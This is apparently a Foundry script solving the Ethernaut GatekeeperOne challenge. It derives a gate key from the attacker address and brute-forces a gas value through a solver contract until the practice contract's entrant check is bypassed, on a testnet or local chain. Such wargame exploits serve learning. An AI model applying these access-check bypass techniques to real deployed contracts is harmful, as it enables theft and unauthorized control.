// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.6.0 <0.9.0; // flexible is better, no?

import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "src/GatekeeperOne/GatekeeperOne.sol";
import "./GatekeeperOneSolver.sol";
contract GatekeeperOneScript is Script {

    address internal attacker;
    address internal deployer;
    GatekeeperOne target;

    /** 
        SETUP SCENARIO
    */
    function setUp() public {
        uint chainId;
        assembly { chainId := chainid() }
        if (chainId == 5) { //goerli chian
            /** Define addresses  (NO NEED TO CHANGE ANYTHING HERE) **/
            attacker = msg.sender;
            /** Setup contract and required init (you may have to modify this section) **/
            target = GatekeeperOne(0x69b7Ef0C085a3F060Bf0dB328c3F5241Da1cE247); //attach to an existing contract:0x0000000000000000000000000000000000000000
        }else{ // local - chainid = 31137
            /** Define actors (NO NEED TO CHANGE ANYTHING HERE) **/
            deployer = vm.addr(1);
            attacker = vm.addr(1337);
            vm.label(deployer, "Deployer");
            vm.label(attacker, "Attacker");
            /** Airdrop (NO NEED TO CHANGE ANYTHING HERE?) **/
            vm.deal(deployer, 100 ether);
            vm.deal(attacker, 0.5 ether);
            /** Setup contract and required init (you may have to modify this section) **/
            vm.startBroadcast(deployer);
            target = new GatekeeperOne();
            vm.stopBroadcast();
        }
    }

    /** 
        CODE YOUR EXPLOIT HERE 
        Do not forget to broadcast as the attacker :)
    **/
    function run() public {
        console.log("[Info]");
        console.log("attacker : %s", attacker);
        
        console.log("[Exploit]");
        bytes8 _gateKey = bytes8(
            abi.encodePacked(
                uint32(1),
                uint32(uint16(uint160(attacker)))
            )
        );
        vm.startBroadcast(attacker);
        GatekeeperOneSolver solver = new GatekeeperOneSolver();
        solver.verifyGateKey(_gateKey);
        for(uint256 gas = 33020 ; gas<38191 ; ++gas ){
            try solver.pwn(address(target), gas, _gateKey) {
                console.log("gas : %s", gas);
                break;
            } catch {}
        }
        vm.stopBroadcast();
        console.log("entrant : %s", target.entrant());
    }
}